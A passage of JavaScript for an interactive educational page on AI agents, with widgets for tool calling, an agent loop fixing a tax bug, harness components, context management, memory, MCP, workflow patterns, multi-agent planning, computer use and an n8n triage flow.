  "content": [ { "type": "text",
    "text": "Yes, take one. There's an 80% chance of rain in Pune today." } ]
}`],
    [1, 0, 'Shows the answer', '# No tool call in the reply, so the loop ends. Two model calls, one tool call.'],
  ];
  let cur = 0, timer;
  const H = 70 + steps.length * 46;
  function render() {
    let s = `<svg viewBox="0 0 810 ${H}" role="img" aria-label="Tool calling sequence diagram">
      <defs><marker id="sqa" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,1 L9,5 L0,9" fill="none" class="s-fg3" stroke-width="1.5"/></marker>
      <marker id="sqb" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,1 L9,5 L0,9" fill="none" class="s-model" stroke-width="1.5"/></marker></defs>`;
    lanes.forEach(([n, k, x]) => {
      s += `<line x1="${x}" y1="44" x2="${x}" y2="${H - 8}" class="s-line" stroke-width="1" stroke-dasharray="2 5"/>
        <rect x="${x - 88}" y="6" width="176" height="36" rx="18" class="f-bg s-${k}" stroke-width="1" stroke-opacity=".8"/>
        <text x="${x}" y="29" text-anchor="middle" class="f-fg" font-size="13" font-weight="500">${n}</text>`;
    });
    steps.forEach(([a, b, lbl], i) => {
      if (i > cur) return;
      const y = 72 + i * 46, x1 = lanes[a][2], x2 = lanes[b][2], onn = i === cur, pad = x2 > x1 ? 6 : -6;
      s += `<line x1="${x1 + pad}" y1="${y}" x2="${x2 - pad}" y2="${y}" class="${onn ? 's-model' : 's-fg3'}" stroke-width="${onn ? 1.8 : 1}" marker-end="url(#${onn ? 'sqb' : 'sqa'})"/>
        <text x="${(x1 + x2) / 2}" y="${y - 8}" text-anchor="middle" font-size="11.5" class="${onn ? 'f-model' : 'f-fg3'}" style="font-family:var(--mono)">${i + 1}. ${esc(lbl)}</text>`;
    });
    $('#seqSvg').innerHTML = s + '</svg>';
    $('#seqCode').textContent = `# step ${cur + 1} of ${steps.length}\n` + steps[cur][3];
    $('#seqPrev').disabled = cur === 0; $('#seqNext').disabled = cur === steps.length - 1;
  }
  $('#seqNext').onclick = () => { cur = Math.min(steps.length - 1, cur + 1); render(); };
  $('#seqPrev').onclick = () => { cur = Math.max(0, cur - 1); render(); };
  $('#seqPlay').onclick = () => { clearInterval(timer); cur = 0; render(); timer = setInterval(() => { if (cur >= steps.length - 1) return clearInterval(timer); cur++; render(); }, 1300); };
  render();
})();

/* ---------- 13 agent loop (3D helix in scenes.js) ---------- */
(function agentLoop() {
  const steps = [
    ['gather', 'Task: "test_checkout fails after the tax change. Fix it." The harness loads CLAUDE.md and the repo layout.', 1800],
    ['think', 'I should see the actual failure before touching code.', 250],
    ['act', 'run_tests("tests/test_checkout.py")', 120],
    ['observe', 'FAILED test_total_with_tax\nAssertionError: expected 107.00, got 800.00', 900],
    ['think', 'A 100.00 cart became 800.00, so tax 7 is used as a multiplier, not as 7%. Check cart.py.', 300],
    ['act', 'read_file("src/cart.py")', 100],
    ['observe', 'line 42:  total = subtotal * (1 + tax)   # tax = 7', 2600],
    ['think', 'Tax is stored as a percentage. Divide by 100.', 200],
    ['act', 'edit_file("src/cart.py", line 42 → "subtotal * (1 + tax / 100)")', 180],
    ['observe', 'Edit applied.', 60],
    ['act', 'run_tests("tests/")', 100],
    ['observe', '48 passed in 3.1s', 400],
    ['think', 'The whole suite passes, so nothing else broke. Goal met.', 200],
    ['done', 'Fixed: cart.py treated tax=7 as ×8 instead of +7%. Line 42 now divides by 100. All 48 tests pass.', 150],
  ];
  const tag = { gather: ['--ctx', 'Context'], think: ['--model', 'Think'], act: ['--tool', 'Act'], observe: ['--ctx', 'Observe'], done: ['--tool', 'Done'] };
  let i = 0, tok = 0, turns = 0, timer;
  const log = $('#agLog');
  function reset() {
    clearInterval(timer); i = 0; tok = 0; turns = 0;
    log.innerHTML = '<div class="ln">Press Step to run the agent one move at a time.</div>';
    $('#agTurn').textContent = 0; $('#agTok').textContent = '0'; $('#agStep').disabled = false;
    emit('agent:reset', {});
  }
  function step() {
    if (i >= steps.length) return;
    if (i === 0) log.innerHTML = '';
    const [ph, txt, t] = steps[i++];
    if (ph === 'think') turns++;
    tok += t;
    const [c, l] = tag[ph];
    log.insertAdjacentHTML('beforeend', `<div class="ln"><em style="color:var(${c})">${l}</em>${esc(txt)}</div>`);
    log.scrollTop = log.scrollHeight;
    $('#agTurn').textContent = turns; $('#agTok').textContent = tok.toLocaleString();
    emit('agent:step', { ph, tok });
    if (i >= steps.length) { $('#agStep').disabled = true; clearInterval(timer); }
  }
  $('#agStep').onclick = step;
  $('#agRun').onclick = () => { if (i >= steps.length) reset(); clearInterval(timer); timer = setInterval(step, 950); step(); };
  $('#agReset').onclick = reset;
  reset();
})();

/* ---------- 14 harness ---------- */
window.HARNESS = [
  { n: 'Instructions', c: '--human', d: 'The system prompt plus project files like CLAUDE.md or AGENTS.md: who the agent is, how to work, house rules, how to test.', x: 'Without it, the agent guesses your conventions and writes code in a style nobody on your team uses.' },
  { n: 'Tools', c: '--tool', d: 'The actions on offer: read, edit and search files, run shell commands, browse, plus anything connected through MCP.', x: 'Without them, a smart model can only talk about the work, not do it.' },
  { n: 'The loop', c: '--model', d: 'Calls the model, runs requested tools, feeds results back, handles retries and errors, enforces turn and budget limits, decides when to stop.', x: 'Without limits, an agent can loop forever, spending money on a task it cannot finish.' },
  { n: 'Context manager', c: '--ctx', d: 'Counts tokens, trims huge tool outputs, compacts history when the window fills, and orders content so prompt caching keeps working.', x: 'Without it, quality decays over long sessions and costs balloon, because every turn re-sends everything.' },
  { n: 'Memory', c: '--mem', d: 'Reads and writes durable notes: project facts, user preferences and progress files, so the next session starts smarter.', x: 'Without it, every session starts from zero and you repeat yourself forever.' },
  { n: 'Permissions & sandbox', c: '--risk', d: 'Allow, ask and deny rules per tool and path; an isolated file system and network; approval prompts for risky actions.', x: 'Without it, one bad instruction or one injected web page can delete files or leak secrets.' },
  { n: 'Hooks', c: '--human', d: 'Your own scripts that run on events: before a tool call (block a dangerous command), after an edit (run the formatter), at the end (post to Slack).', x: 'Without them, you enforce rules by hoping the model remembers the prompt.' },
  { n: 'Subagents', c: '--model', d: 'Helper agents with their own context window and tools, spawned for parallel or messy work such as searching a large codebase.', x: 'Without them, the main agent fills its window with search noise and loses the plot.' },
  { n: 'Interface', c: '--human', d: 'Where people meet the agent: terminal, IDE, desktop app, chat apps, Slack, an API, or a background job that opens a pull request.', x: 'Without a good one, people can\'t see, steer, interrupt or approve, so they can\'t trust it.' },
];
(function harness() {
  const list = $('#hList'), info = $('#hInfo');
  list.innerHTML = HARNESS.map((h, i) => `<button data-i="${i}" style="--c:var(${h.c})"><i></i>${h.n}</button>`).join('');
  on('harness:select', i => {
    const h = HARNESS[i];
    $$('button', list).forEach((b, j) => b.classList.toggle('on', i === j));
    info.innerHTML = `<span class="kicker" style="color:var(${h.c})">${h.n}</span><p>${h.d}</p><p><strong>${esc(h.x)}</strong></p>`;
  });
  list.onclick = e => { const b = e.target.closest('button'); if (b) emit('harness:select', +b.dataset.i); };
  emit('harness:select', 2);
})();

/* ---------- 15 context engineering sim ---------- */
(function ceSim() {
  const LIMIT = 200000, BASE = 16000, TURNS = 60, cv = $('#ceChart');
  let data = [], shown = 0, anim;
  function simulate() {
    let seed = 42; const rnd = () => (seed = (seed * 16807) % 2147483647) / 2147483647;
    const compact = $('#ceCompact').checked, clear = $('#ceClear').checked, sub = $('#ceSub').checked;
    let items = [], out = [], total = 0, atLimit = 0;
    for (let t = 0; t < TURNS; t++) {
      const r = rnd(), type = r < .6 ? 'small' : r < .85 ? 'file' : 'search';
      let size = type === 'small' ? 2000 + rnd() * 3000 : type === 'file' ? 9000 + rnd() * 10000 : 20000 + rnd() * 15000;
      if (sub && type === 'search') size = 1500;
      items.push({ t, size: size + 1200, tool: true });
      if (clear) items.forEach(it => { if (it.tool && t - it.t > 3) it.size = Math.min(it.size, 700); });
      let ctx = BASE + items.reduce((a, x) => a + x.size, 0);
      if (compact && ctx > LIMIT * .8) { items = [{ t, size: 9000, tool: false }]; ctx = BASE + 9000; }
      if (ctx > LIMIT) { atLimit++; while (ctx > LIMIT && items.length > 1) ctx -= items.shift().size; }
      out.push(ctx); total += ctx;
    }
    return { out, total, atLimit, peak: Math.max(...out) };
  }
  function draw() {
    const { g, w, h } = hidpi(cv), p = { l: 48, r: 14, t: 16, b: 28 }, W = w - p.l - p.r, H = h - p.t - p.b;
    const X = i => p.l + i / (TURNS - 1) * W, Y = v => p.t + H - v / (LIMIT * 1.05) * H;
    g.clearRect(0, 0, w, h);
    g.font = '10.5px ' + css('--mono'); g.fillStyle = css('--fg3'); g.strokeStyle = css('--line'); g.lineWidth = 1;
    [0, 50000, 100000, 150000, 200000].forEach(v => { g.beginPath(); g.moveTo(p.l, Y(v)); g.lineTo(w - p.r, Y(v)); g.stroke(); g.textAlign = 'right'; g.fillText(v / 1000 + 'K', p.l - 10, Y(v) + 4); });
    g.textAlign = 'center'; [0, 15, 30, 45, 59].forEach(i => g.fillText('TURN ' + (i + 1), Math.min(Math.max(X(i), p.l + 24), w - 40), h - 8));
    g.setLineDash([4, 5]); g.strokeStyle = css('--risk'); g.beginPath(); g.moveTo(p.l, Y(LIMIT)); g.lineTo(w - p.r, Y(LIMIT)); g.stroke(); g.setLineDash([]);
    g.fillStyle = css('--risk'); g.textAlign = 'right'; g.fillText('CONTEXT LIMIT', w - p.r, Y(LIMIT) - 7);
    const n = Math.min(shown, data.length); if (n < 2) return;
    const grad = g.createLinearGradient(0, p.t, 0, p.t + H); grad.addColorStop(0, css('--ctx') + '40'); grad.addColorStop(1, css('--ctx') + '00');
    g.beginPath(); g.moveTo(X(0), Y(0)); for (let i = 0; i < n; i++) g.lineTo(X(i), Y(data[i])); g.lineTo(X(n - 1), Y(0)); g.closePath(); g.fillStyle = grad; g.fill();
    g.beginPath(); for (let i = 0; i < n; i++) i ? g.lineTo(X(i), Y(data[i])) : g.moveTo(X(i), Y(data[i])); g.strokeStyle = css('--ctx'); g.lineWidth = 1.6; g.stroke();
    g.fillStyle = css('--ctx'); g.beginPath(); g.arc(X(n - 1), Y(data[n - 1]), 3.5, 0, 7); g.fill();
  }
  function run(animate) {
    const r = simulate(); data = r.out;
    $('#cePeak').textContent = (r.peak / 1000).toFixed(0) + 'K';
    $('#ceTotal').textContent = (r.total / 1e6).toFixed(2) + 'M';
    $('#ceFail').textContent = r.atLimit; $('#ceFail').className = r.atLimit ? 'c-risk' : 'c-tool';
    cancelAnimationFrame(anim);
    if (!animate || reduced) { shown = TURNS; draw(); return; }
    shown = 0; const t0 = performance.now();
    const f = now => { shown = Math.ceil((now - t0) / 1600 * TURNS); draw(); if (shown < TURNS) anim = requestAnimationFrame(f); };
    anim = requestAnimationFrame(f);
  }
  $('#ceRun').onclick = () => run(true);
  ['#ceCompact', '#ceClear', '#ceSub'].forEach(s => $(s).onchange = () => run(true));
  run(false); onResize(draw); onTheme(draw);
})();

/* ---------- 16 memory ---------- */
(function memory() {
  let timers = [];
  const s1 = $('#memS1'), s2 = $('#memS2'), file = $('#memFile');
  const clear = () => { timers.forEach(clearTimeout); timers = []; s1.innerHTML = '<span class="kicker">Monday session</span>'; s2.innerHTML = '<span class="kicker">Friday session</span>'; file.textContent = '(empty)'; };
  const at = (ms, fn) => timers.push(setTimeout(fn, reduced ? 0 : ms));
  const bub = (el, who, t) => el.insertAdjacentHTML('beforeend', `<div class="bub ${who}">${t}</div>`);
  function play() {
    clear(); const onn = $('#memOn').checked;
    at(200, () => bub(s1, 'u', "Quick context: I'm vegetarian, I live in Pune, and I don't like long recipes."));
    at(1100, () => bub(s1, 'a', onn ? 'Got it. I\'ll remember that.' : 'Got it!'));
    at(1700, () => { file.textContent = onn ? '# About the user\n- Diet: vegetarian\n- City: Pune\n- Prefers recipes under 20 min\n\n(saved Mon 14:02 by the harness)' : '(memory off: nothing saved)'; });
    at(2700, () => bub(s2, 'u', 'What should I make for dinner tonight?'));
    at(3300, () => onn && s2.insertAdjacentHTML('beforeend', '<p class="kicker" style="color:var(--mem)">harness loaded memory/user.md</p>'));
    at(3900, () => bub(s2, 'a', onn ? 'A 15-minute paneer bhurji with toast. Vegetarian, quick, and paneer is easy to find in Pune.' : 'How about grilled chicken with roasted vegetables? It takes about 45 minutes. <span class="c-risk">Generic, and it breaks all three preferences.</span>'));
  }
  $('#memPlay').onclick = play; $('#memOn').onchange = play;
  $('#memFlow').innerHTML = flowSVG({
    w: 880, h: 300, label: 'Memory types',
    nodes: [
      { id: 'sem', x: 140, y: 55, label: 'Semantic memory', sub: 'facts: "user is vegetarian"', k: 'mem' },
      { id: 'epi', x: 140, y: 150, label: 'Episodic memory', sub: 'events: "deploy failed Tuesday"', k: 'mem' },
      { id: 'pro', x: 140, y: 245, label: 'Procedural memory', sub: 'how-to: skills, CLAUDE.md', k: 'mem' },
      { id: 'h', x: 440, y: 150, label: 'Harness', sub: 'decides what to save and recall', k: 'human', strong: true },
      { id: 'ses', x: 730, y: 55, label: 'Session history', sub: 'this conversation, compacted', k: 'ctx' },
      { id: 'ctx', x: 730, y: 190, label: 'Context window', sub: 'working memory · this call only', k: 'ctx', strong: true, w: 230 },
    ],
    edges: [['sem', 'h'], ['epi', 'h'], ['pro', 'h'], ['ses', 'h'], ['h', 'ctx'], ['ctx', 'h', { dash: 1, below: 70, k: 'mem' }]],
  });
  play();
})();

/* ---------- 17 MCP (3D graph in scenes.js) ---------- */
(function mcp() {
  const pick = m => {
    emit('mcp:mode', m);
    $$('[data-mcp]').forEach(b => b.classList.toggle('on', +b.dataset.mcp === m));
    $('#mcpHud').innerHTML = m ? '<b>11</b> connections' : '<b>30</b> custom integrations';
    $('#mcpNote').innerHTML = m ? 'Five clients plus six servers: eleven pieces of work. Each app speaks MCP once, each tool ships one server, and a new app gets every tool for free.'
      : 'Five apps times six tools: thirty custom integrations, each with its own auth, format and bugs. This was normal before late 2024.';
  };
  $$('[data-mcp]').forEach(b => b.onclick = () => pick(+b.dataset.mcp));
  pick(0);
})();

/* ---------- 18 autonomy + patterns ---------- */
(function patterns() {
  const L = [
    ['Rules only', 'No AI. If this, then that: classic automation, scripts and scheduled jobs.', 'Every invoice email is saved to a folder.', 'Use it when the input never varies. It breaks as soon as a person writes something unexpected.', '--fg3'],
    ['AI step in a fixed workflow', 'Your code runs the steps; one step asks a model to classify, extract or draft.', 'Extract vendor, amount and due date from each invoice, then write them to the ledger.', 'Where most business automation should start. Errors stay inside one step and are easy to evaluate.', '--ctx'],
    ['Workflow with an agent step', 'A fixed pipeline where one step is an agent with a few tools and a turn limit.', 'For each new lead, an agent researches the company, then a fixed step writes to the CRM.', 'A good balance of flexibility and control. Validate the agent\'s output before the next step uses it.', '--tool'],
    ['Agent with human approval', 'The agent plans and acts; anything irreversible pauses for a person.', 'A coding agent opens a pull request; a support agent proposes a refund a person approves.', 'The sweet spot for most serious work in 2026. People review outcomes instead of doing steps.', '--mem'],
    ['Autonomous agent', 'Runs for minutes or hours, decides every step, reports back when done.', 'Background coding agents, deep-research agents, a personal agent with full computer access.', 'Only with strong sandboxing, hard budgets, monitoring and tasks where mistakes are recoverable.', '--model'],
  ];
  const dial = $('#autoDial');
  const show = () => {
    const [n, d, ex, use, c] = L[+dial.value];
    $('#autoOut').innerHTML = `<i class="dotk" style="--c:var(${c})"></i> Level ${+dial.value} · ${n}`;
    $('#autoInfo').innerHTML = `<div class="panel"><span class="kicker">What it looks like</span><p>${d}</p><p><strong>Example.</strong> ${ex}</p></div><div class="panel"><span class="kicker">Use it when</span><p>${use}</p></div>`;
  };
  dial.oninput = show; show();
  const P = [
    { n: 'Chaining', d: 'Split a task into fixed steps. Each model call works on the previous output, with code "gates" checking progress between steps.', w: 'The task splits cleanly into ordered subtasks: outline, draft, polish; or extract, validate, summarise.',
      s: { w: 860, h: 170, nodes: [{ id: 'i', x: 60, y: 85, label: 'Input', k: 'human' }, { id: 'a', x: 215, y: 85, label: 'LLM 1', sub: 'outline', k: 'model' }, { id: 'g', x: 375, y: 85, label: 'Gate', sub: 'code check', k: 'risk' }, { id: 'b', x: 530, y: 85, label: 'LLM 2', sub: 'draft', k: 'model' }, { id: 'c', x: 685, y: 85, label: 'LLM 3', sub: 'polish', k: 'model' }, { id: 'o', x: 810, y: 85, label: 'Out', k: 'human', w: 80 }], edges: [['i', 'a'], ['a', 'g'], ['g', 'b'], ['b', 'c'], ['c', 'o']] } },
    { n: 'Routing', d: 'A classifier, often a small model, sends each input to a specialised handler.', w: 'Inputs fall into distinct categories that deserve different prompts, tools or model sizes. Easy questions can go to a cheap model.',
      s: { w: 860, h: 250, nodes: [{ id: 'i', x: 70, y: 125, label: 'Ticket', k: 'human' }, { id: 'r', x: 260, y: 125, label: 'Router', sub: 'classify intent', k: 'model' }, { id: 'a', x: 500, y: 45, label: 'Refund flow', sub: 'strict policy + tools', k: 'tool' }, { id: 'b', x: 500, y: 125, label: 'Tech support', sub: 'RAG over docs', k: 'mem' }, { id: 'c', x: 500, y: 205, label: 'FAQ', sub: 'small fast model', k: 'ctx' }, { id: 'o', x: 750, y: 125, label: 'Reply', k: 'human' }], edges: [['i', 'r'], ['r', 'a'], ['r', 'b'], ['r', 'c'], ['a', 'o'], ['b', 'o'], ['c', 'o']] } },
    { n: 'Parallel', d: 'Run several model calls at once, then combine: split the work (sectioning) or ask several times and vote.', w: 'Independent checks such as facts, tone and safety, or when several attempts raise confidence.',
      s: { w: 860, h: 250, nodes: [{ id: 'i', x: 70, y: 125, label: 'Draft', k: 'human' }, { id: 'a', x: 330, y: 45, label: 'Check facts', k: 'model' }, { id: 'b', x: 330, y: 125, label: 'Check tone', k: 'model' }, { id: 'c', x: 330, y: 205, label: 'Check safety', k: 'risk' }, { id: 'g', x: 590, y: 125, label: 'Aggregate', sub: 'code or LLM', k: 'ctx' }, { id: 'o', x: 780, y: 125, label: 'Verdict', k: 'human' }], edges: [['i', 'a'], ['i', 'b'], ['i', 'c'], ['a', 'g'], ['b', 'g'], ['c', 'g'], ['g', 'o']] } },
    { n: 'Orchestrator', d: 'A lead model breaks the task into subtasks at runtime, hands them to workers (often subagents), then combines the results.', w: 'You can\'t know the subtasks in advance: a change touching unknown files, or research across unknown sources.',
      s: { w: 860, h: 250, nodes: [{ id: 'i', x: 70, y: 125, label: 'Task', k: 'human' }, { id: 'or', x: 250, y: 125, label: 'Orchestrator', sub: 'plans subtasks', k: 'model', strong: true }, { id: 'a', x: 480, y: 45, label: 'Worker 1', sub: 'own context', k: 'tool' }, { id: 'b', x: 480, y: 125, label: 'Worker 2', sub: 'own context', k: 'tool' }, { id: 'c', x: 480, y: 205, label: 'Worker n', sub: 'spawned as needed', k: 'tool' }, { id: 's', x: 700, y: 125, label: 'Synthesise', sub: 'orchestrator', k: 'model' }], edges: [['i', 'or'], ['or', 'a'], ['or', 'b'], ['or', 'c'], ['a', 's'], ['b', 's'], ['c', 's']] } },
    { n: 'Evaluator', d: 'One model generates, another critiques against clear criteria, and the loop repeats until the work passes.', w: 'You can state what "good" means (tests pass, style guide met, translation faithful) and iteration visibly helps.',
      s: { w: 860, h: 230, nodes: [{ id: 'i', x: 80, y: 80, label: 'Task', k: 'human' }, { id: 'g', x: 320, y: 80, label: 'Generator', sub: 'writes attempt', k: 'model' }, { id: 'e', x: 570, y: 80, label: 'Evaluator', sub: 'scores + feedback', k: 'risk' }, { id: 'o', x: 790, y: 80, label: 'Pass → out', k: 'human', w: 120 }], edges: [['i', 'g'], ['g', 'e'], ['e', 'g', { below: 90, dash: 1, k: 'risk' }], ['e', 'o']], extra: '<text x="445" y="205" text-anchor="middle" class="f-fg3" font-size="11" style="font-family:var(--mono)">feedback until it passes</text>' } },
    { n: 'Autonomous', d: 'The model runs the loop itself: plans, uses tools, reads results and decides when it is done. The environment supplies ground truth at each step.', w: 'Open-ended problems where the number of steps can\'t be predicted. Needs sandboxing, limits and a way to check its work.',
      s: { w: 860, h: 250, nodes: [{ id: 'h', x: 80, y: 125, label: 'Human', sub: 'goal + approvals', k: 'human' }, { id: 'a', x: 330, y: 125, label: 'Agent (LLM)', sub: 'plan · act · check', k: 'model', strong: true }, { id: 't', x: 600, y: 55, label: 'Tools', sub: 'act on the world', k: 'tool' }, { id: 'env', x: 600, y: 195, label: 'Environment', sub: 'results, errors, tests', k: 'ctx' }, { id: 'stop', x: 790, y: 125, label: 'Stop', k: 'risk', w: 90 }], edges: [['h', 'a'], ['a', 't'], ['t', 'env'], ['env', 'a'], ['a', 'stop', { dash: 1 }]] } },
  ];
  seg($('#patTabs'), P.map(p => p.n), 0, i => {
    $('#patSvg').innerHTML = flowSVG({ ...P[i].s, label: P[i].n });
    $('#patInfo').innerHTML = `<div class="panel"><span class="kicker" style="color:var(--model)">How it works</span><p>${P[i].d}</p></div><div class="panel"><span class="kicker" style="color:var(--tool)">Use it when</span><p>${P[i].w}</p></div>`;
  });
})();

/* ---------- 19 multi-agent (3D swarm in scenes.js) ---------- */
(function swarm() {
  const D = [5, 3, 2, 4, 6, 3, 2, 4], SUM = D.reduce((a, b) => a + b, 0), MIN = .5;
  const plan = n => {
    const loads = Array.from({ length: n }, () => []), tot = Array(n).fill(0);
    [...D].sort((a, b) => b - a).forEach(d => { const k = tot.indexOf(Math.min(...tot)); loads[k].push(d); tot[k] += d; });
    return { loads, span: Math.max(...tot) };
  };
  const stats = n => {
    const { span } = plan(n), single = (SUM + 2) * MIN, multi = (span + 2) * MIN;
    const tokS = SUM * 10, tokM = SUM * 10 * 2.4 + n * 40 + 60;
    $('#swTime').textContent = multi.toFixed(1) + ' min';
    $('#swSpeed').textContent = (single / multi).toFixed(1) + '× faster';
    $('#swTok').textContent = (tokM / tokS).toFixed(1) + '× tokens';
  };
  const n = () => +$('#swN').value;
  $('#swN').oninput = () => { $('#swNOut').textContent = n(); stats(n()); emit('swarm:size', n()); };
  $('#swRun').onclick = () => { stats(n()); emit('swarm:run', { n: n(), loads: plan(n()).loads }); };
  stats(n()); emit('swarm:size', n());
})();

/* ---------- 20 computer use ---------- */
(function computerUse() {
  const scr = $('#cuScreen'), cur = $('#cuCursor'), log = $('#cuLog'), shot = $('#cuShot');
  const S = [
    ['shot', null, 'screenshot()', 'I see a dashboard. "Rooms" is in the left sidebar.'],
    ['click', 'rooms', 'left_click(Rooms)', 'Opened the booking form.'],
    ['click', 'date', 'left_click(Date) · type("Fri 2 Oct")', null, () => { $('#cuDate').textContent = 'Fri 2 Oct'; }],
    ['click', 'time', 'left_click(Time) · type("15:00")', null, () => { $('#cuTime').textContent = '15:00'; }],
    ['click', 'room', 'left_click(Room) · select("Orion, 8 seats")', null, () => { $('#cuRoom').textContent = 'Orion, 8 seats'; }],
    ['shot', null, 'screenshot()', 'Date, time and room are filled correctly. Ready to book.'],
    ['click', 'book', 'left_click(Book)', null, () => { $('#cuDone').hidden = false; }],
    ['shot', null, 'screenshot()', 'Confirmation visible: Orion, Friday 15:00. Task complete.'],
  ];
  let i = 0, timer;
  const move = el => {
    const r = el.getBoundingClientRect(), b = scr.getBoundingClientRect();
    cur.style.transform = `translate(${r.left - b.left + Math.min(40, r.width / 2)}px, ${r.top - b.top + r.height / 2}px)`;
  };
  function reset() {
    clearInterval(timer); i = 0;
    $('#cuDate').textContent = $('#cuTime').textContent = $('#cuRoom').textContent = '—'; $('#cuDone').hidden = true;
    $$('.hl', scr).forEach(e => e.classList.remove('hl'));
    cur.style.transform = 'translate(60%, 70%)';
    log.innerHTML = '<div class="ln">Task: "Book a meeting room for Friday at 3pm." Press Step.</div>';
    $('#cuStep').disabled = false;
  }
  function step() {
    if (i >= S.length) return;
    if (i === 0) log.innerHTML = '';
    const [kind, el, act, obs, fx] = S[i++];
    $$('.hl', scr).forEach(e => e.classList.remove('hl'));
    if (kind === 'shot') { shot.classList.add('on'); setTimeout(() => shot.classList.remove('on'), 450); }
    else { const t = $(`[data-el="${el}"]`, scr); t.classList.add('hl'); move(t); }
    fx && setTimeout(fx, reduced ? 0 : 500);
    log.insertAdjacentHTML('beforeend', `<div class="ln"><em style="color:var(${kind === 'shot' ? '--ctx' : '--tool'})">${kind === 'shot' ? 'Look' : 'Act'}</em>${esc(act)}${obs ? `\n<span style="color:var(--fg)">→ ${esc(obs)}</span>` : ''}</div>`);
    log.scrollTop = log.scrollHeight;
    if (i >= S.length) { $('#cuStep').disabled = true; clearInterval(timer); }
  }
  $('#cuStep').onclick = step;
  $('#cuRun').onclick = () => { if (i >= S.length) reset(); clearInterval(timer); timer = setInterval(step, 1100); step(); };
  $('#cuReset').onclick = reset;
  reset();
})();

/* ---------- 21 stack ---------- */
(function stack() {
  const S = [
    ['Compute & chips', '--fg3', 'The physical layer. Training and running models needs specialised chips in huge data centres.', ['NVIDIA GPUs', 'Google TPUs', 'AWS Trainium', 'AWS · Azure · GCP', 'CoreWeave']],
    ['Foundation models', '--model', 'The engines, reached through an API, a cloud platform, or downloaded as open weights and self-hosted.', ['Anthropic Claude', 'OpenAI GPT', 'Google Gemini', 'Meta Llama', 'Mistral', 'DeepSeek', 'Qwen', 'Bedrock · Vertex · Foundry', 'OpenRouter', 'Ollama · vLLM']],
    ['Data & retrieval', '--mem', 'Where your knowledge lives and how agents find it: vector search, keyword search, databases.', ['Postgres + pgvector', 'Pinecone', 'Weaviate', 'Qdrant', 'Chroma', 'Elasticsearch', 'LlamaIndex', 'Embedding models']],
    ['Protocols & standards', '--ctx', 'The shared plugs that let everything interoperate.', ['MCP', 'A2A', 'Agent Skills', 'AGENTS.md', 'OpenTelemetry']],
    ['Agent frameworks & SDKs', '--tool', 'Libraries that give you the loop, tools, memory and multi-agent plumbing.', ['Claude Agent SDK', 'OpenAI Agents SDK', 'Google ADK', 'LangChain · LangGraph', 'CrewAI', 'Microsoft Agent Framework', 'Pydantic AI', 'Mastra', 'Vercel AI SDK', 'DSPy']],
    ['Automation & no-code', '--tool', 'Visual builders for workflows with AI steps. The fastest route for business teams.', ['n8n', 'Zapier', 'Make', 'Dify', 'Flowise', 'Lindy']],
    ['Harnesses & agent products', '--human', 'Finished agents you use directly, each a harness around one or more models.', ['Claude Code', 'OpenAI Codex', 'Cursor', 'GitHub Copilot', 'Gemini CLI', 'Devin', 'OpenClaw', 'ChatGPT agent']],
    ['Ops, evals & guardrails', '--risk', 'See what agents did, measure quality, block bad inputs and outputs.', ['LangSmith', 'Langfuse', 'Braintrust', 'Arize Phoenix', 'Helicone', 'Llama Guard', 'NeMo Guardrails', 'Guardrails AI']],
  ];
  const box = $('#stack3d'), info = $('#stackInfo');
  box.innerHTML = S.map((s, i) => `<button class="plate" data-i="${i}" style="--i:${i};--c:var(${s[1]});z-index:${i + 1}">${s[0]}</button>`).join('');
  const pick = i => {
    $$('.plate', box).forEach((p, j) => p.classList.toggle('on', i === j));
    const [n, c, d, xs] = S[i];
    info.innerHTML = `<span class="kicker" style="color:var(${c})">Layer ${i + 1} of ${S.length}</span><h4 style="font:400 26px/1.1 var(--serif)">${n}</h4><p>${d}</p><div class="chips">${xs.map(x => `<span>${x}</span>`).join('')}</div>`;
  };
  box.onclick = e => { const b = e.target.closest('.plate'); if (b) pick(+b.dataset.i); };
  pick(4);
})();

/* ---------- 22 n8n + OpenClaw ---------- */
(function n8nClaw() {
  const info = {
    trig: ['Gmail Trigger', 'Fires on every new email. Triggers can also be webhooks, schedules, form submissions or chat messages.'],
    agent: ['AI Agent node', 'The model reads the email, decides which attached tools to call, and returns structured output such as {category, urgency, summary}. Set a maximum number of iterations here.'],
    model: ['Chat Model sub-node', 'Plug in Claude, GPT, Gemini, or a local model through Ollama. Swap it without rebuilding the flow.'],
    mem: ['Memory sub-node', 'Keeps recent conversation per sender, or stores it in Postgres or Redis so it survives restarts.'],
    tools: ['Tool sub-nodes', 'CRM lookup, web search, a calculator, another workflow, or any MCP server. The agent decides when to use them.'],
    if: ['IF node', 'Plain deterministic logic: urgency == "high" goes to Slack. A guardrail you can see: the AI classifies, code decides what happens next.'],
    slack: ['Slack node', 'Posts the summary to #support-urgent. A human-approval step could sit here before anything reaches a customer.'],
    sheet: ['Google Sheets node', 'Logs every email and decision. Your audit trail now, your eval dataset later.'],
  };
  const el = $('#n8nFlow');
  el.innerHTML = flowSVG({
    w: 880, h: 300, label: 'n8n inbox triage workflow',
    nodes: [
      { id: 'trig', x: 85, y: 110, label: 'Gmail Trigger', sub: 'on new email', k: 'human', click: 1 },
      { id: 'agent', x: 330, y: 110, label: 'AI Agent', sub: 'classify + summarise', k: 'model', click: 1, strong: true, w: 180 },
      { id: 'model', x: 225, y: 245, label: 'Chat model', k: 'model', click: 1, w: 104 },
      { id: 'mem', x: 335, y: 245, label: 'Memory', k: 'mem', click: 1, w: 96 },
      { id: 'tools', x: 440, y: 245, label: 'Tools', k: 'tool', click: 1, w: 90 },
      { id: 'if', x: 580, y: 110, label: 'IF urgent?', k: 'ctx', click: 1 },
      { id: 'slack', x: 790, y: 50, label: 'Slack alert', k: 'tool', click: 1 },
      { id: 'sheet', x: 790, y: 175, label: 'Log to Sheets', k: 'tool', click: 1 },
    ],
    edges: [['trig', 'agent'], ['model', 'agent', { dash: 1, nodot: 1 }], ['mem', 'agent', { dash: 1, nodot: 1 }], ['tools', 'agent', { dash: 1, nodot: 1 }], ['agent', 'if'], ['if', 'slack'], ['if', 'sheet']],
  });
  const show = id => { const [n, d] = info[id]; $('#n8nInfo').innerHTML = `<span class="kicker">Node</span><h4>${n}</h4><p>${d}</p>`; };
  clickable(el, show); show('agent');
  $('#clawFlow').innerHTML = flowSVG({
    w: 880, h: 320, label: 'OpenClaw architecture',
    nodes: [
